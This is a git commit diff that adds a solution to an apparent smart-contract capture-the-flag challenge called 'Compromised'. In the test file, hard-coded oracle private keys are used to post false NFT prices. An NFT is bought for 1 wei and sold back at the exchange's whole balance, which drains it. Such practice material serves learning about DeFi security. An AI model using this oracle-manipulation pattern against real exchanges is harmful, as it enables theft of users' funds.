35f18b253b2e5473de8f7c14ad39ddb4465cdee4
Makg2 <aradhya2010211@akgec.ac.in>
2022-11-13 23:12:47 +0530

    7th done

--- test/compromised/compromised.challenge.js
+++ test/compromised/compromised.challenge.js
@@ -61,6 +61,28 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        const p1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9"
+        const p2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"
+
+        const w1 = new ethers.Wallet(p1, ethers.provider)
+        const w2 = new ethers.Wallet(p2, ethers.provider)
+        
+        await this.oracle.connect(w1).postPrice("DVNFT",0)
+        await this.oracle.connect(w2).postPrice("DVNFT",0)
+        
+        await this.exchange.connect(attacker).buyOne({value: 1})
+
+        const pr = await ethers.provider.getBalance(this.exchange.address)
+
+        await this.oracle.connect(w1).postPrice("DVNFT",pr)
+        await this.oracle.connect(w2).postPrice("DVNFT",pr)
+
+        await this.nftToken.connect(attacker).approve(this.exchange.address, 0)
+        await this.exchange.connect(attacker).sellOne(0)
+
+        await this.oracle.connect(w1).postPrice("DVNFT",INITIAL_NFT_PRICE)
+        await this.oracle.connect(w2).postPrice("DVNFT",INITIAL_NFT_PRICE)
+
     });
 
     after(async function () {
